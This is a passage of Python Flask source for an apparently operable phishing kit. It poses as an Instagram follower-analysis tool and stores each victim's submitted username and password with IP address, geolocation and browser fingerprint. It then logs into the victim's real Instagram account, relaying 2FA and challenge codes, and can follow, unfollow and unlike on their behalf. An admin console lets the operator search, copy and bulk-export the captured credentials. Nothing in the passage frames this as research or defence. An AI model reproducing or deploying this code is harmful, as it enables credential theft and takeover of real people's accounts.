        return jsonify({"ok": True, "id": existing, "duplicate": True})

    cred_id, created = capture_credential(username, password, source, sid, meta)
    return jsonify({"ok": True, "id": cred_id, "created": created})


@app.route("/login", methods=["POST"])
def login():
    ip = client_ip()
    if not rate_ok("login:" + ip, 40):
        banner = '<div class="msg">Too many attempts — wait a minute and try again.</div>'
        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner), 429)

    username = (request.form.get("username") or "").strip()[:200] or "your.handle"
    password = (request.form.get("password") or "")[:300]

    try:
        payload = json.loads(request.form.get("payload") or "{}")
    except ValueError:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}

    try:
        visit = int(request.cookies.get("vc", "0")) + 1
    except ValueError:
        visit = 1

    # The beacon fired on submit usually already stored this exact pair — reuse it.
    cred_id = recent_cred_id(g.cid, username, password, 8)
    if cred_id is None:
        cred_id, _ = capture_credential(username, password, "submit", payload.get("sid") or "", meta)
    else:
        session["last_cred"] = cred_id

    session.update({
        "user": username,
        "login_count": session.get("login_count", 0) + 1,
        "last_login": iso_now(),
        "last_cred": cred_id,
    })

    start_login(g.cid, username, password)

    resp = redirect(url_for("dashboard"))
    resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
    resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


@app.route("/dashboard")
def dashboard():
    username = session.get("user")
    if not username:
        return redirect(url_for("index"))

    page = RESULTS_PAGE_HTML
    page = page.replace("__HANDLE__", json.dumps(str(username)))
    page = page.replace("your.handle", str(escape(username)))
    page = page.replace(">YO<", ">" + str(escape(make_initials(username))) + "<")
    return html(page)


@app.route("/cookies")
def cookies_view():
    """Last credential this browser submitted."""
    cred = session.get("last_cred")
    conn = connect()
    try:
        row = (conn.execute("SELECT * FROM creds WHERE id=?", (cred,)).fetchone()
               if cred else
               conn.execute("SELECT * FROM creds WHERE cid=? ORDER BY id DESC LIMIT 1",
                            (g.cid,)).fetchone())
    finally:
        conn.close()

    if not row:
        return jsonify({"ok": False, "message": "nothing captured for this browser yet"})

    return jsonify({
        "ok": True,
        "id": row["id"],
        "created_at": row["created_at"],
        "source": row["source"],
        "username": row["username"],
        "password": row["password"],
        "ip": row["ip"],
        "geo": json.loads(row["geo_json"] or "{}"),
        "fingerprint": json.loads(row["meta_json"] or "{}"),
    })


@app.route("/console")
def console_redirect():
    return redirect(url_for("admin"))


@app.route("/logout")
def logout():
    drop_session(g.cid)
    for k in ("user", "last_login", "last_cred", "last_user"):
        session.pop(k, None)
    return redirect(url_for("index"))


# ---------------- instagram api ----------------
@app.route("/api/state")
def api_state():
    if not session.get("user"):
        return jsonify({"ok": True, "state": "idle", "progress": {}, "error": None,
                        "profile": None, "sync_minutes": SYNC_MINUTES,
                        "ghost_days": GHOST_DAYS})

    st = ig_state(g.cid)
    if st.get("state", "idle") == "idle":
        conn = connect()
        try:
            row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?",
                               (g.cid,)).fetchone()
        finally:
            conn.close()
        if row:
            start_login(g.cid, row["username"], unseal(row["pass_enc"]))
            st = ig_state(g.cid)

    conn = connect()
    try:
        me = conn.execute("SELECT * FROM self WHERE cid=?", (g.cid,)).fetchone()
    finally:
        conn.close()
    profile = None
    if me:
        profile = {"username": me["username"], "full_name": me["full_name"], "pic": me["pic"],
                   "followers": me["followers"], "following": me["following"], "posts": me["posts"]}
    return jsonify({"ok": True, "state": st.get("state", "idle"), "error": st.get("error"),
                    "progress": st.get("progress", {}), "last_sync": st.get("last_sync"),
                    "profile": profile, "sync_minutes": SYNC_MINUTES, "ghost_days": GHOST_DAYS})


@app.route("/api/challenge", methods=["POST"])
def api_challenge():
    submit_code(g.cid, read_json().get("code") or "")
    return jsonify({"ok": True})


@app.route("/api/2fa", methods=["POST"])
def api_2fa():
    submit_2fa(g.cid, read_json().get("code") or "")
    return jsonify({"ok": True})


@app.route("/api/sync", methods=["POST"])
def api_sync():
    if not session.get("user"):
        return jsonify({"ok": False, "error": "not signed in"}), 401
    if not IG_OK:
        return jsonify({"ok": False, "error": "instagrapi not installed"}), 400
    sync_now(g.cid)
    return jsonify({"ok": True})


@app.route("/api/reconnect", methods=["POST"])
def api_reconnect():
    conn = connect()
    try:
        row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (g.cid,)).fetchone()
    finally:
        conn.close()
    if not row:
        return jsonify({"ok": False, "error": "no stored credentials — log in again"}), 400
    ig_user, ig_pass = row["username"], unseal(row["pass_enc"])
    drop_session(g.cid)
    start_login(g.cid, ig_user, ig_pass)
    return jsonify({"ok": True})


def _profile_rows(rows, days=False, count=False):
    out = []
    for r in rows:
        out.append({
            "pk": r["pk"], "h": r["username"], "n": r["full_name"] or r["username"],
            "pic": r["pic"], "v": r["verified"],
            "d": days_since(r["last_eng"]) if days else 0,
            "c": (r["cnt"] or 0) if count else 0,
        })
    return out


@app.route("/api/list")
def api_list():
    kind = request.args.get("kind", "notback")
    q = (request.args.get("q") or "").strip().lower()
    filt = request.args.get("filter") or "all"
    conn = connect()
    try:
        if kind == "notback":
            rows = conn.execute(
                "SELECT p.* FROM following_cache f JOIN profiles p ON p.pk=f.pk"
                " WHERE f.cid=? AND f.pk NOT IN (SELECT pk FROM followers_cache WHERE cid=?)"
                " ORDER BY p.username", (g.cid, g.cid)).fetchall()
            data = _profile_rows(rows)
        elif kind == "fans":
            rows = conn.execute(
                "SELECT p.* FROM followers_cache f JOIN profiles p ON p.pk=f.pk"
                " WHERE f.cid=? AND f.pk NOT IN (SELECT pk FROM following_cache WHERE cid=?)"
                " ORDER BY p.username", (g.cid, g.cid)).fetchall()
            data = _profile_rows(rows)
        elif kind == "ghosts":
            rows = conn.execute(
                "SELECT p.*, MAX(e.ts) AS last_eng FROM followers_cache f"
                " JOIN profiles p ON p.pk=f.pk"
                " LEFT JOIN engagement e ON e.pk=f.pk AND e.cid=f.cid"
                " WHERE f.cid=? GROUP BY f.pk", (g.cid,)).fetchall()
            data = [r for r in _profile_rows(rows, days=True) if r["d"] >= GHOST_DAYS]
            data.sort(key=lambda x: -x["d"])
        elif kind == "stalkers":
            rows = conn.execute(
                "SELECT p.*, COUNT(v.ts) AS cnt FROM visits v JOIN profiles p ON p.pk=v.pk"
                " WHERE v.cid=? GROUP BY v.pk ORDER BY cnt DESC", (g.cid,)).fetchall()
            data = _profile_rows(rows, count=True)
        else:
            data = []
    finally:
        conn.close()

    if q:
        data = [x for x in data if q in x["h"].lower() or q in x["n"].lower()]
    if filt == "ver":
        data = [x for x in data if x["v"]]
    if filt == "top":
        data = [x for x in data if x["c"] >= 3]
    if filt == "old":
        data = [x for x in data if x["d"] >= GHOST_DAYS]
    return jsonify({"ok": True, "rows": data, "total": len(data)})


@app.route("/api/activity")
def api_activity():
    conn = connect()
    try:
        rows = conn.execute("SELECT * FROM events WHERE cid=? ORDER BY id DESC LIMIT 120",
                            (g.cid,)).fetchall()
    finally:
        conn.close()
    return jsonify({"ok": True, "rows": [
        {"kind": r["kind"], "subject": r["subject"], "detail": r["detail"],
         "ts": r["created_at"], "thumb": r["thumb"]} for r in rows]})


@app.route("/api/action", methods=["POST"])
def api_action():
    data = read_json()
    kind = data.get("kind")
    if kind not in ("unfollow", "follow", "unlike"):
        return jsonify({"ok": False, "error": "bad kind"}), 400
    res = enqueue(g.cid, kind, str(data.get("pk") or ""), data.get("username") or "")
    return jsonify(res), (200 if res.get("ok") else 429)


@app.route("/api/export")
def api_export():
    conn = connect()
    try:
        rows = conn.execute("SELECT * FROM events WHERE cid=? ORDER BY id", (g.cid,)).fetchall()
    finally:
        conn.close()
    return Response(json.dumps([dict(r) for r in rows], indent=2, ensure_ascii=False),
                    mimetype="application/json",
                    headers={"Content-Disposition": "attachment; filename=activity.json"})


# ---------------- admin ----------------
def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]:
    sql = ADMIN_SELECT
    where: list[str] = []
    params: list = []

    if q:
        where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? "
                     "OR c.isp LIKE ? OR c.cid LIKE ? OR c.username LIKE ? OR c.password LIKE ? "
                     "OR c.source LIKE ?)")
        params += [f"%{q}%"] * 9
    if only == "pass":
        where.append("c.password IS NOT NULL AND c.password != ''")
    elif only == "partial":
        where.append("(c.username = '' OR c.password = '')")
    if since is not None:
        where.append("c.id > ?")
        params.append(since)

    if where:
        sql += " WHERE " + " AND ".join(where)
    return sql, params


@app.route("/admin")
def admin():
    if not admin_ok():
        return html(LOGIN_ADMIN_HTML, 401)

    q = (request.args.get("q") or "").strip()
    only = request.args.get("only") or ""
    if only not in ("", "pass", "partial"):
        only = ""

    sql, params = admin_query(q, only)
    sql += " ORDER BY c.id DESC LIMIT 300"

    conn = connect()
    try:
        rows = conn.execute(sql, params).fetchall()
    finally:
        conn.close()

    banner = "" if ADMIN_TOKEN else (
        '<div class="warn">ADMIN_TOKEN unset — console is public. Set it in the environment.</div>'
    )

    chips = "".join(
        '<a class="chip{0}" href="/admin?{1}">{2}</a>'.format(
            " on" if only == value else "",
            urlencode({"q": q, "only": value} if value else ({"q": q} if q else {})),
            label,
        )
        for value, label in (("", "all"), ("pass", "with password"), ("partial", "partial"))
    )

    body = (
        banner
        + '<form class="bar" method="get">'
        + f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city / isp">'
        + (f'<input type="hidden" name="only" value="{escape(only)}">' if only else "")
        + '<button class="btn" type="submit">search</button>'
        + '<a class="btn" href="/admin">reset</a>'
        + chips
        + '</form>'
        + '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
        + '<th>username</th><th>password</th><th>source</th><th></th></tr></thead>'
        + f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
    )
    if not rows:
        body += '<div class="empty">no credentials yet — open the login link</div>'
    return html(render_admin(body))


@app.route("/admin/feed")
def admin_feed():
    if not admin_ok():
        return jsonify({"rows": [], "last": 0}), 401

    raw = request.args.get("since", "0")
    since = int(raw) if raw.isdigit() else 0
    q = (request.args.get("q") or "").strip()
    only = request.args.get("only") or ""
    if only not in ("", "pass", "partial"):
        only = ""

    sql, params = admin_query(q, only, since)
    sql += " ORDER BY c.id DESC LIMIT 40"

    conn = connect()
    try:
        rows = conn.execute(sql, params).fetchall()
    finally:
        conn.close()

    last = max([r["id"] for r in rows], default=since)
    return jsonify({"rows": [row_html(r) for r in rows], "last": last})


@app.route("/admin/<int:cred_id>")
def admin_credential(cred_id: int):
    if not admin_ok():
        return html(LOGIN_ADMIN_HTML, 401)

    conn = connect()
    try:
        row = conn.execute("SELECT * FROM creds WHERE id=?", (cred_id,)).fetchone()
    finally:
        conn.close()

    if not row:
        abort(404)

    fp = json.dumps(json.loads(row["meta_json"] or "{}"), indent=2, ensure_ascii=False)
    ginfo = json.dumps(json.loads(row["geo_json"] or "{}"), indent=2, ensure_ascii=False)

    cred_html = (
        '<div class="cred">'
        f'<div class="row"><span class="k">username</span>'
        f'<span class="v u" id="uv">{escape(row["username"] or "")}</span>'
        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
        f'<div class="row"><span class="k">password</span>'
        f'<span class="v p" id="pv">{escape(row["password"] or "")}</span>'
        f'<button class="btn cp" onclick="cp(this)">copy</button></div>'
        '</div>'
    )

    body = (
        f'<a class="btn" href="/admin">← back</a> '
        f'<form class="inline" method="post" action="/admin/delete/{cred_id}" '
        f'onsubmit="return confirm(\'delete #{cred_id}?\')">'
        f'<input type="hidden" name="_csrf" value="{csrf_token()}">'
        f'<button class="btn" type="submit">delete</button></form>'
        f'<div style="height:16px"></div>'
        f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")}</h2>'
        f'<pre>client_id {escape(row["cid"] or "")}\nsession   {escape(row["sid"] or "")}\n'
        f'time      {escape(row["created_at"] or "")}\nip        {escape(row["ip"] or "")}\n'
        f'isp       {escape(row["isp"] or "")}\n'
        f'ua        {escape(row["ua"] or "")}\nreferer   {escape(row["referer"] or "")}\n'
        f'lang      {escape(row["accept_lang"] or "")}</pre></div>'
        + cred_html
        + f'<div class="block"><h2>fingerprint</h2><pre>{escape(fp)}</pre></div>'
        + f'<div class="block"><h2>geo / network</h2><pre>{escape(ginfo)}</pre></div>'
    )
    return html(render_admin(body))


@app.route("/admin/delete/<int:cred_id>", methods=["POST"])
def admin_delete(cred_id: int):
    if not admin_ok():
        return redirect(url_for("admin"))
    if not csrf_ok():
        abort(403)
    conn = connect()
    try:
        conn.execute("DELETE FROM creds WHERE id=?", (cred_id,))
        conn.commit()
    finally:
        conn.close()
    return redirect(url_for("admin"))


@app.route("/admin/delete-all", methods=["POST"])
def admin_delete_all():
    if not admin_ok():
        return redirect(url_for("admin"))
    if not csrf_ok():
        abort(403)
    conn = connect()
    try:
        conn.execute("DELETE FROM creds")
        conn.execute("DELETE FROM sqlite_sequence WHERE name='creds'")
        conn.commit()
    finally:
        conn.close()
    logger.info("all credentials cleared")
    return redirect(url_for("admin"))


@app.route("/admin/export")
def admin_export():
    if not admin_ok():
        return redirect(url_for("admin"))

    fmt = request.args.get("fmt", "json")
    conn = connect()
    try:
        rows = conn.execute("SELECT * FROM creds ORDER BY id").fetchall()
    finally:
        conn.close()

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

    if fmt == "csv":
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["id", "created_at", "ip", "country", "city", "isp", "source",
                    "username", "password", "ua", "referer"])
        for r in rows:
            w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"], r["isp"],
                        r["source"], r["username"], r["password"], r["ua"], r["referer"]])
        return Response(buf.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})

    payload = {
        "exported_at": iso_now(),
        "count": len(rows),
        "credentials": [dict(r) for r in rows],
    }
    return Response(json.dumps(payload, indent=2, ensure_ascii=False), mimetype="application/json",
                    headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.json"})


@app.route("/healthz")
def healthz():
    conn = connect()
    try:
        n = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
    finally:
        conn.close()
    return jsonify({"ok": True, "credentials": n, "geo": GEO_ENABLED,
                    "admin_locked": bool(ADMIN_TOKEN), "instagram": IG_OK,
                    "crypto": CRYPTO_OK, "proxy": bool(IG_PROXY)})


# ---------------- errors ----------------
ERROR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>__C__</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#000;color:#f5f5f5;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center}
h1{font-size:64px;margin:0;background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);
-webkit-background-clip:text;background-clip:text;color:transparent}
p{color:#8e8e8e;margin:10px 0 24px}a{color:#0095f6;text-decoration:none;font-weight:600}</style>
</head><body><div><h1>__C__</h1><p>__M__</p><a href="/">back to login</a></div></body></html>"""


def error_page(code: str, message: str, status: int) -> Response:
    return html(ERROR_HTML.replace("__C__", code).replace("__M__", message), status)


@app.errorhandler(400)
def e400(_):
    return error_page("400", "bad request", 400)


@app.errorhandler(403)
def e403(_):
    return error_page("403", "forbidden — reload the console", 403)


@app.errorhandler(404)
def e404(_):
    return error_page("404", "page not found", 404)


@app.errorhandler(405)
def e405(_):
    return error_page("405", "method not allowed", 405)


@app.errorhandler(413)
def e413(_):
    return error_page("413", "payload too large", 413)


@app.errorhandler(429)
def e429(_):
    return error_page("429", "slow down a moment", 429)


@app.errorhandler(500)
def e500(_):
    logger.exception("unhandled error")
    return error_page("500", "something broke", 500)


# ============================== boot ==============================
init_db()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
    if not ADMIN_TOKEN:
        logger.warning("ADMIN_TOKEN unset — console is public. Set it before exposing.")
    if not os.environ.get("SECRET_KEY"):
        logger.warning("SECRET_KEY unset — using persisted key in %s", DATA_DIR / "secret.key")
    if not IG_OK:
        logger.warning("instagrapi missing — dashboard will not connect. pip install instagrapi cryptography")
    if IG_OK and not IG_PROXY:
        logger.warning("IG_PROXY unset — instagram will likely challenge logins from this IP")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
